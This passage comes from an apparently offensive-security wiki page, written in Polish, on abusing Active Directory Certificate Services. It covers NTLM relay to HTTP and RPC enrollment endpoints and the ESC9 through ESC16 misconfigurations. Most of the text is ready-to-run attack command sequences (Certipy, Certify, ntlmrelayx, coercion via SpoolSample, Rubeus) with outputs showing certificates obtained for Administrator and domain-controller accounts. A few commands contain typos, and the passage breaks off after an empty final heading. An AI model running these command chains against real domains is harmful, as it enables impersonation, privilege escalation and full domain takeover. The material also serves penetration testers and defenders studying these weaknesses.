- **Certificate Enrollment Service** (CES), **Certificate Enrollment Policy** (CEP) Web Service oraz **Network Device Enrollment Service** (NDES) domyślnie obsługują negotiate authentication za pośrednictwem nagłówka Authorization HTTP. Uwierzytelnianie Negotiate **obsługuje zarówno** Kerberos, jak i **NTLM**, co pozwala attackerowi na **obniżenie poziomu do** uwierzytelniania NTLM podczas relay attacks. Chociaż te web services domyślnie włączają HTTPS, samo HTTPS **nie chroni przed NTLM relay attacks**. Ochrona usług HTTPS przed NTLM relay attacks jest możliwa wyłącznie wtedy, gdy HTTPS jest połączone z channel binding. Niestety AD CS nie włącza Extended Protection for Authentication w IIS, która jest wymagana do channel binding.<sup>[[6]](#references)</sup>

Częstym **problemem** w przypadku NTLM relay attacks jest **krótki czas trwania sesji NTLM** oraz brak możliwości interakcji attackera z usługami, które **wymagają NTLM signing**.

Ograniczenie to można jednak obejść, wykorzystując NTLM relay attack do uzyskania certyfikatu dla użytkownika, ponieważ okres ważności certyfikatu określa czas trwania sesji, a certyfikatu można używać z usługami, które **wymagają NTLM signing**. Instrukcje dotyczące używania skradzionego certyfikatu znajdują się tutaj:


{{#ref}}
account-persistence.md
{{#endref}}

Kolejnym ograniczeniem NTLM relay attacks jest to, że **komputer kontrolowany przez attackera musi zostać uwierzytelniony przez konto ofiary**. Attacker może zaczekać lub spróbować **wymusić** takie uwierzytelnienie:


{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Nadużycie**

[**Certify**](https://github.com/GhostPack/Certify)`s `cas` enumeruje **włączone endpointy HTTP AD CS**:<sup>[[4]](#references)</sup>
```
Certify.exe cas
```
<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

Właściwość `msPKI-Enrollment-Servers` jest używana przez enterprise Certificate Authorities (CA) do przechowywania endpointów Certificate Enrollment Service (CES). Endpointy te można przeanalizować i wyświetlić za pomocą narzędzia **Certutil.exe**:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>
```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Abuse with Certify
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### Nadużycie z użyciem [Certipy](https://github.com/ly4k/Certipy)

Certipy domyślnie składa żądanie certyfikatu na podstawie template `Machine` lub `User`, zależnie od tego, czy nazwa konta poddawanego relay kończy się znakiem `$`. Wskazanie alternatywnego template można zrealizować za pomocą parametru `-template`.

Następnie można użyć techniki takiej jak [PetitPotam](https://github.com/ly4k/PetitPotam) w celu wymuszenia uwierzytelniania. W przypadku kontrolerów domeny wymagane jest wskazanie `-template DomainController`.
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## No Security Extension - ESC9 <a href="#id-5485" id="id-5485"></a>

### Wyjaśnienie

Nowa wartość **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) dla **`msPKI-Enrollment-Flag`**, określana jako ESC9, uniemożliwia osadzanie **nowego rozszerzenia bezpieczeństwa `szOID_NTDS_CA_SECURITY_EXT`** w certyfikacie. Ta flaga staje się istotna, gdy `StrongCertificateBindingEnforcement` jest ustawione na `1` (ustawienie domyślne), w przeciwieństwie do wartości `2`. Jej znaczenie wzrasta w scenariuszach, w których można wykorzystać słabsze mapowanie certyfikatu dla Kerberos lub Schannel (jak w ESC10), ponieważ brak ESC9 nie zmieniłby wymagań.<sup>[[7]](#references)</sup>

Warunki, w których ustawienie tej flagi staje się istotne, obejmują:

- `StrongCertificateBindingEnforcement` nie jest ustawione na `2` (wartość domyślna to `1`) lub `CertificateMappingMethods` zawiera flagę `UPN`.
- Certyfikat ma ustawioną flagę `CT_FLAG_NO_SECURITY_EXTENSION` w ustawieniu `msPKI-Enrollment-Flag`.
- Certyfikat określa dowolny EKU uwierzytelniania klienta.
- Dostępne są uprawnienia `GenericWrite` do dowolnego konta, aby przejąć inne konto.

### Scenariusz nadużycia

Załóżmy, że `John@corp.local` ma uprawnienia `GenericWrite` do `Jane@corp.local`, a celem jest przejęcie `Administrator@corp.local`. Szablon certyfikatu `ESC9`, do którego `Jane@corp.local` może się zapisywać, jest skonfigurowany z flagą `CT_FLAG_NO_SECURITY_EXTENSION` w ustawieniu `msPKI-Enrollment-Flag`.

Najpierw hash `Jane` zostaje pozyskany za pomocą Shadow Credentials dzięki uprawnieniom `GenericWrite` użytkownika `John`:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
Następnie atrybut `userPrincipalName` użytkownika `Jane` zostaje zmodyfikowany na `Administrator`, celowo z pominięciem części domeny `@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Ta modyfikacja nie narusza ograniczeń, ponieważ `Administrator@corp.local` nadal pozostaje odrębną wartością `userPrincipalName` użytkownika `Administrator`.

Następnie podatny szablon certyfikatu `ESC9` zostaje zażądany przez `Jane`:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
Zauważono, że `userPrincipalName` certyfikatu odzwierciedla `Administrator`, bez żadnego „object SID”.

`userPrincipalName` użytkowniczki `Jane` zostaje następnie przywrócony do oryginalnej wartości `Jane@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Próba uwierzytelnienia przy użyciu wystawionego certyfikatu zwraca teraz hash NT konta `Administrator@corp.local`. Polecenie musi zawierać `-domain <domain>` z powodu braku określenia domeny w certyfikacie:
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
## Słabe mapowania certyfikatów - ESC10

### Wyjaśnienie

ESC10 odnosi się do dwóch wartości kluczy rejestru na kontrolerze domeny:

- Wartość domyślna `CertificateMappingMethods` w `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` to `0x18` (`0x8 | 0x10`), wcześniej ustawiona na `0x1F`.
- Domyślne ustawienie `StrongCertificateBindingEnforcement` w `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` to `1`, wcześniej `0`.<sup>[[7]](#references)</sup>

**Przypadek 1**

Gdy `StrongCertificateBindingEnforcement` jest skonfigurowane jako `0`.

**Przypadek 2**

Jeśli `CertificateMappingMethods` zawiera bit `UPN` (`0x4`).

### Przypadek nadużycia 1

Gdy `StrongCertificateBindingEnforcement` jest skonfigurowane jako `0`, konto A z uprawnieniami `GenericWrite` może zostać wykorzystane do przejęcia dowolnego konta B.

Na przykład, mając uprawnienia `GenericWrite` do `Jane@corp.local`, attacker chce przejąć `Administrator@corp.local`. Procedura odzwierciedla ESC9, umożliwiając wykorzystanie dowolnego certificate template.

Najpierw hash `Jane` jest pobierany przy użyciu Shadow Credentials, wykorzystując `GenericWrite`.
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
Następnie wartość `userPrincipalName` użytkownika `Jane` zostaje zmieniona na `Administrator`, celowo z pominięciem części `@corp.local`, aby uniknąć naruszenia ograniczenia.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Następnie żąda się certyfikatu umożliwiającego uwierzytelnianie klienta jako `Jane`, korzystając z domyślnego szablonu `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`userPrincipalName` użytkownika `Jane` zostaje następnie przywrócony do pierwotnej wartości: `Jane@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Uwierzytelnienie za pomocą uzyskanego certyfikatu zwróci hash NT użytkownika `Administrator@corp.local`, co wymaga określenia domeny w poleceniu, ponieważ certyfikat nie zawiera informacji o domenie.
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Przypadek nadużycia 2

Gdy `CertificateMappingMethods` zawiera flagę bitową `UPN` (`0x4`), konto A z uprawnieniami `GenericWrite` może przejąć dowolne konto B, któremu brakuje właściwości `userPrincipalName`, w tym konta komputerów oraz wbudowane konto administratora domeny `Administrator`.

Celem jest przejęcie `DC$@corp.local`, zaczynając od uzyskania hasha `Jane` za pomocą Shadow Credentials i wykorzystując `GenericWrite`.
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
`userPrincipalName` użytkownika `Jane` zostaje następnie ustawiona na `DC$@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
Certyfikat do uwierzytelniania klienta jest żądany jako `Jane` przy użyciu domyślnego szablonu `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`userPrincipalName` użytkownika `Jane` zostanie po tym procesie przywrócony do swojej pierwotnej wartości.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Do uwierzytelnienia za pośrednictwem Schannel używana jest opcja `-ldap-shell` narzędzia Certipy, co wskazuje na pomyślne uwierzytelnienie jako `u:CORP\DC$`.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Za pośrednictwem powłoki LDAP polecenia takie jak `set_rbcd` umożliwiają ataki Resource-Based Constrained Delegation (RBCD), potencjalnie prowadząc do przejęcia kontrolera domeny.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Ta podatność obejmuje również każde konto użytkownika pozbawione `userPrincipalName` lub takie, w którym nie odpowiada on wartości `sAMAccountName`, przy czym domyślne konto `Administrator@corp.local` jest głównym celem ze względu na podwyższone uprawnienia LDAP oraz domyślny brak `userPrincipalName`.

## Relaying NTLM to ICPR - ESC11

### Wyjaśnienie

Jeśli CA Server nie został skonfigurowany z `IF_ENFORCEENCRYPTICERTREQUEST`, możliwe jest przeprowadzanie ataków NTLM relay bez podpisywania za pośrednictwem usługi RPC. [Reference in here](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).<sup>[[10]](#references)</sup>

Możesz użyć `certipy`, aby sprawdzić, czy opcja `Enforce Encryption for Requests` jest wyłączona; certipy wyświetli podatności `ESC11`.
```bash
$ certipy find -u <user>@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### Scenariusz nadużycia

Należy skonfigurować serwer relay:
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
Uwaga: W przypadku kontrolerów domeny musimy określić `-template` w DomainController.

Lub używając [forka impacket autorstwa sploutchy](https://github.com/sploutchy/impacket):
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## Dostęp do powłoki na ADCS CA za pomocą YubiHSM - ESC12

### Wyjaśnienie

Administratorzy mogą skonfigurować Certificate Authority tak, aby przechowywał ją na zewnętrznym urządzeniu, takim jak „Yubico YubiHSM2”.

Jeśli urządzenie USB jest podłączone do serwera CA przez port USB lub przez serwer urządzeń USB w przypadku, gdy serwer CA jest maszyną wirtualną, do generowania kluczy i korzystania z nich w YubiHSM przez Key Storage Provider wymagany jest klucz uwierzytelniający (czasami określany jako „hasło”).

Ten klucz/hasło jest przechowywany w rejestrze w lokalizacji `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` w postaci jawnego tekstu.

Odwołanie znajduje się [tutaj](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).<sup>[[11]](#references)</sup>

### Scenariusz wykorzystania

Jeśli klucz prywatny CA jest przechowywany na fizycznym urządzeniu USB i uzyskasz dostęp do powłoki, możliwe jest jego odzyskanie.

Najpierw musisz uzyskać certyfikat CA (jest publiczny), a następnie:
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
Finally, use the certutil `-sign` command to forge a new arbitrary certificate using the CA certificate and its private key.

## OID Group Link Abuse - ESC13

### Wyjaśnienie

Atrybut `msPKI-Certificate-Policy` umożliwia dodanie policy issuance do certificate template. Obiekty `msPKI-Enterprise-Oid`, które odpowiadają za wydawanie policies, można znaleźć w Configuration Naming Context (CN=OID,CN=Public Key Services,CN=Services) kontenera PKI OID. Policy można powiązać z grupą AD za pomocą atrybutu `msDS-OIDToGroupLink` tego obiektu, co umożliwia systemowi autoryzowanie użytkownika przedstawiającego certificate tak, jakby był członkiem tej grupy. [Reference in here](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).<sup>[[12]](#references)</sup>

Innymi słowy, gdy użytkownik ma uprawnienia do enroll certificate, a certificate jest powiązany z grupą OID, użytkownik może odziedziczyć uprawnienia tej grupy.

Użyj [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1), aby znaleźć OIDToGroupLink:
```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### Scenariusz nadużycia

Znajdź uprawnienie użytkownika, korzystając z `certipy find` lub `Certify.exe find /showAllPermissions`.

Jeśli `John` ma uprawnienia do rejestracji w `VulnerableTemplate`, użytkownik może odziedziczyć uprawnienia grupy `VulnerableGroup`.

Wystarczy określić template, aby otrzymać certyfikat z uprawnieniami OIDToGroupLink.
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## Podatna konfiguracja odnowienia certyfikatu - ESC14

### Wyjaśnienie

Opis na stronie https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping jest wyjątkowo szczegółowy. Poniżej znajduje się cytat z oryginalnego tekstu.<sup>[[14]](#references)</sup>

ESC14 dotyczy podatności wynikających ze „słabego jawnego mapowania certyfikatu”, przede wszystkim wskutek niewłaściwego użycia lub niebezpiecznej konfiguracji atrybutu `altSecurityIdentities` na kontach użytkowników lub komputerów w Active Directory. Ten atrybut wielowartościowy umożliwia administratorom ręczne powiązanie certyfikatów X.509 z kontem AD na potrzeby uwierzytelniania. Po skonfigurowaniu takie jawne mapowania mogą zastąpić domyślną logikę mapowania certyfikatów, która zazwyczaj opiera się na nazwach UPN lub DNS w SAN certyfikatu albo na identyfikatorze SID zawartym w rozszerzeniu zabezpieczeń `szOID_NTDS_CA_SECURITY_EXT`.

„Słabe” mapowanie występuje, gdy wartość tekstowa używana w atrybucie `altSecurityIdentities` do identyfikacji certyfikatu jest zbyt ogólna, łatwa do odgadnięcia, opiera się na nieunikatowych polach certyfikatu lub wykorzystuje łatwe do podszycia elementy certyfikatu. Jeśli atakujący może uzyskać lub utworzyć certyfikat, którego atrybuty pasują do tak słabo zdefiniowanego jawnego mapowania uprzywilejowanego konta, może użyć tego certyfikatu do uwierzytelnienia się jako to konto i podszycia się pod nie.

Przykłady potencjalnie słabych ciągów mapowania `altSecurityIdentities` obejmują:

- Mapowanie wyłącznie na podstawie typowej nazwy Common Name (CN) podmiotu: np. `X509:<S>CN=SomeUser`. Atakujący może być w stanie uzyskać certyfikat z takim CN z mniej bezpiecznego źródła.
- Użycie zbyt ogólnych nazw wyróżniających (DN) wystawcy lub podmiotu bez dodatkowych kwalifikatorów, takich jak konkretny numer seryjny lub identyfikator klucza podmiotu: np. `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.
- Wykorzystanie innych przewidywalnych wzorców lub niekryptograficznych identyfikatorów, które atakujący może być w stanie spełnić w certyfikacie, który może legalnie uzyskać lub sfałszować (jeśli przejął CA albo znalazł podatny template, taki jak w ESC1).

Atrybut `altSecurityIdentities` obsługuje różne formaty mapowania, takie jak:

- `X509:<I>IssuerDN<S>SubjectDN` (mapowanie na podstawie pełnych DN wystawcy i podmiotu)
- `X509:<SKI>SubjectKeyIdentifier` (mapowanie na podstawie wartości rozszerzenia Subject Key Identifier certyfikatu)
- `X509:<SR>SerialNumberBackedByIssuerDN` (mapowanie na podstawie numeru seryjnego, niejawnie kwalifikowanego przez DN wystawcy) - nie jest to standardowy format, zwykle stosuje się `<I>IssuerDN<SR>SerialNumber`.
- `X509:<RFC822>EmailAddress` (mapowanie na podstawie nazwy RFC822, zazwyczaj adresu e-mail, z SAN)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (mapowanie na podstawie skrótu SHA1 surowego klucza publicznego certyfikatu - zasadniczo silne)

Bezpieczeństwo tych mapowań w dużym stopniu zależy od szczegółowości, unikatowości i siły kryptograficznej wybranych identyfikatorów certyfikatu użytych w ciągu mapowania. Nawet przy włączonych na kontrolerach domeny silnych trybach powiązania certyfikatów (które dotyczą przede wszystkim niejawnych mapowań opartych na UPN/DNS w SAN oraz rozszerzeniu SID), nieprawidłowo skonfigurowany wpis `altSecurityIdentities` nadal może stanowić bezpośrednią drogę do podszycia się, jeśli sama logika mapowania jest wadliwa lub zbyt liberalna.
### Scenariusz nadużycia

ESC14 dotyczy **jawnych mapowań certyfikatów** w Active Directory (AD), a konkretnie atrybutu `altSecurityIdentities`. Jeśli ten atrybut jest ustawiony (celowo lub wskutek błędnej konfiguracji), atakujący może podszywać się pod konta, przedstawiając certyfikaty pasujące do mapowania.

#### Scenariusz A: Atakujący może zapisywać do `altSecurityIdentities`

**Warunek wstępny**: Atakujący ma uprawnienia zapisu do atrybutu `altSecurityIdentities` konta docelowego lub uprawnienie do ich przyznania w postaci jednego z następujących uprawnień do docelowego obiektu AD:
- Write property `altSecurityIdentities`
- Write property `Public-Information`
- Write property (all)
- `WriteDACL`
- `WriteOwner`*
- `GenericWrite`
- `GenericAll`
- Owner*.
#### Scenariusz B: Cel ma słabe mapowanie X509RFC822 (e-mail)

- **Warunek wstępny**: Cel ma słabe mapowanie X509RFC822 w `altSecurityIdentities`. Atakujący może ustawić atrybut mail ofiary tak, aby pasował do nazwy X509RFC822 celu, zapisać ofiarę na certyfikat i użyć go do uwierzytelnienia się jako cel.
#### Scenariusz C: Cel ma mapowanie X509IssuerSubject

- **Warunek wstępny**: Cel ma słabe jawne mapowanie X509IssuerSubject w `altSecurityIdentities`. Atakujący może ustawić atrybut `cn` lub `dNSHostName` podmiotu-ofiary tak, aby pasował do podmiotu mapowania X509IssuerSubject celu. Następnie atakujący może zapisać ofiarę na certyfikat i użyć tego certyfikatu do uwierzytelnienia się jako cel.
#### Scenariusz D: Cel ma mapowanie X509SubjectOnly

- **Warunek wstępny**: Cel ma słabe jawne mapowanie X509SubjectOnly w `altSecurityIdentities`. Atakujący może ustawić atrybut `cn` lub `dNSHostName` podmiotu-ofiary tak, aby pasował do podmiotu mapowania X509SubjectOnly celu. Następnie atakujący może zapisać ofiarę na certyfikat i użyć tego certyfikatu do uwierzytelnienia się jako cel.
### konkretne operacje
#### Scenariusz A

Zażądaj certyfikatu na podstawie certificate template `Machine`
```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```
Zapisz i przekonwertuj certyfikat
```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```
Uwierzytelnij się (używając certyfikatu)
```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```
Czyszczenie (opcjonalne)
```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```
W przypadku bardziej szczegółowych attack methods w różnych attack scenarios zapoznaj się z: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).<sup>[[13]](#references)</sup>

## EKUwu Application Policies(CVE-2024-49019) - ESC15

### Wyjaśnienie

Opis dostępny pod adresem https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc jest wyjątkowo szczegółowy. Poniżej znajduje się cytat z oryginalnego tekstu.<sup>[[15]](#references)</sup>

Korzystając z wbudowanych, domyślnych certificate templates w wersji 1, attacker może przygotować CSR zawierający application policies, które mają pierwszeństwo przed skonfigurowanymi atrybutami Extended Key Usage określonymi w template. Jedynym wymaganiem są uprawnienia do enrollment, a rozwiązanie to może służyć do generowania client authentication, certificate request agent oraz codesigning certificates przy użyciu template **_WebServer_**

### Abuse

Dokumentacja [Certipy privilege-escalation](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu) zawiera bardziej szczegółowe przykłady użycia.<sup>[[14]](#references)</sup>


Polecenie `find` narzędzia Certipy może pomóc zidentyfikować templates w wersji V1, które potencjalnie są podatne na ESC15, jeśli CA nie została załatana.
```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```
#### Scenariusz A: Bezpośrednia impersonacja przez Schannel

**Krok 1: Zażądaj certyfikatu, wstrzykując Application Policy „Client Authentication” oraz docelowy UPN.** Attacker `attacker@corp.local` obiera za cel `administrator@corp.local`, używając szablonu V1 „WebServer” (który pozwala na `enrollee-supplied subject`).
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
-application-policies 'Client Authentication'
```
- `-template 'WebServer'`: Podatny template V1 z opcją „Enrollee supplies subject”.
- `-application-policies 'Client Authentication'`: Wstrzykuje OID `1.3.6.1.5.5.7.3.2` do rozszerzenia Application Policies żądania CSR.
- `-upn 'administrator@corp.local'`: Ustawia UPN w SAN w celu impersonacji.

**Krok 2: Uwierzytelnij się za pomocą Schannel (LDAPS), używając uzyskanego certyfikatu.**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```
#### Scenariusz B: Impersonacja PKINIT/Kerberos przez nadużycie Enrollment Agent

**Krok 1: Zażądaj certyfikatu z szablonu V1 (z opcją „Enrollee supplies subject”), wstrzykując Application Policy „Certificate Request Agent”.** Ten certyfikat jest przeznaczony dla attackera (`attacker@corp.local`), aby mógł zostać enrollment agentem. W tym miejscu nie określono UPN dla własnej tożsamości attackera, ponieważ celem jest uzyskanie możliwości działania jako agent.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-application-policies 'Certificate Request Agent'
```
- `-application-policies 'Certificate Request Agent'`: Wstrzykuje OID `1.3.6.1.4.1.311.20.2.1`.

**Krok 2: Użyj certyfikatu „agenta”, aby zażądać certyfikatu w imieniu docelowego uprzywilejowanego użytkownika.** Jest to krok podobny do ESC3, wykorzystujący certyfikat z Kroku 1 jako certyfikat agenta.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'User' \
-pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```
**Krok 3: Uwierzytelnij się jako uprzywilejowany użytkownik przy użyciu certyfikatu „on-behalf-of”.**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```
## Security Extension Disabled on CA (Globally)-ESC16

### Explanation

**ESC16 (Elevation of Privilege via Missing szOID_NTDS_CA_SECURITY_EXT Extension)** odnosi się do scenariusza, w którym, jeśli konfiguracja AD CS nie wymusza dołączania rozszerzenia **szOID_NTDS_CA_SECURITY_EXT** do wszystkich certyfikatów, attacker może to wykorzystać poprzez:

1. Zażądanie certyfikatu **bez SID binding**.

2. Użycie tego certyfikatu **do uwierzytelnienia jako dowolne konto**, na przykład w celu impersonacji konta o wysokich uprawnieniach (np. Domain Administrator).

Możesz również zapoznać się z tym artykułem, aby dowiedzieć się więcej o szczegółowej zasadzie:https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6<sup>[[16]](#references)</sup>

### Abuse

Poniżej znajduje się odwołanie do [tego linku](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally),Kliknij, aby zobaczyć bardziej szczegółowe metody użycia.<sup>[[14]](#references)</sup>

Aby sprawdzić, czy środowisko Active Directory Certificate Services (AD CS) jest podatne na **ESC16**
```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```
**Krok 1: Odczytaj początkowy UPN konta ofiary (opcjonalnie — w celu przywrócenia).**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -user 'victim' \
read
```
**Krok 2: Zaktualizuj UPN konta ofiary do wartości `sAMAccountName` docelowego administratora.**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'administrator' \
-user 'victim' update
```
**Krok 3: (Jeśli to konieczne) Uzyskaj dane uwierzytelniające konta „ofiary” (np. za pomocą Shadow Credentials).**
```shell
certipy shadow \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -account 'victim' \
auto
```
**Krok 4: Zażądaj certyfikatu jako użytkownik _„victim”_ z _dowolnego odpowiedniego szablonu uwierzytelniania klienta_ (np. „User”) na podatnym na ESC16 CA.** Ponieważ CA jest podatny na ESC16, automatycznie pominie rozszerzenie zabezpieczeń SID w wydanym certyfikacie, niezależnie od konkretnych ustawień szablonu dotyczących tego rozszerzenia. Ustaw zmienną środowiskową pamięci podręcznej poświadczeń Kerberos (polecenie powłoki):
```bash
export KRB5CCNAME=victim.ccache
```
Następnie zażądaj certyfikatu:
```bash
certipy req \
-k -dc-ip '10.0.0.100' \
-target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
-template 'User'
```
**Krok 5: Przywróć UPN konta „victim”.**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'victim@corp.local' \
-user 'victim' update
```
**Krok 6: Uwierzytelnij się jako docelowy administrator.**
```bash
certipy auth \
-dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
-username 'administrator' -domain 'corp.local'
```
## Podstawienie tożsamości w callbacku Rogue LDAP/LSA chase (Certighost / CVE-2026-54121)

### Wyjaśnienie

